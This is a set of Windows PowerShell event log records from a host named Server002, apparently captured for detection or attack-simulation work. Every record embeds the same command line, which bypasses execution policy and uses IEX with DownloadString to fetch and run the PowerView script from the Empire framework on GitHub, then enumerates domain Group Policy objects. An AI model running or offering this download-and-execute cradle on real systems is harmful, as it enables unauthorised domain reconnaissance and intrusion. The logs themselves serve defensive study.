{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.3703057"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.3789304"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.3859987"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.4178417"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.4263057"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.4263057"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:52.5893249"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=c26328d8-6cae-4c11-964f-d186f103027b\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.2275522"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.2297075"},"EventRecordID":"1051","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.2297075"},"EventRecordID":"1052","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.3287085"},"EventRecordID":"1053","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.3287085"},"EventRecordID":"1054","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.3351894"},"EventRecordID":"1055","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:35:54.4327387"},"EventRecordID":"1056","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=d7e5a503-23ea-4559-b41c-edd02c3abf83\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:36:00.5895268"},"EventRecordID":"1057","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=fd8ff24f-c23a-4b27-bb9d-57391c7e2a4a\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=d7e5a503-23ea-4559-b41c-edd02c3abf83\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 16:36:00.6870326"},"EventRecordID":"1058","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=4bc09ad2-f67b-4c51-ac14-63bed3bf48f4\r\n\tHostApplication=powershell.exe &amp; {powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=c26328d8-6cae-4c11-964f-d186f103027b\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
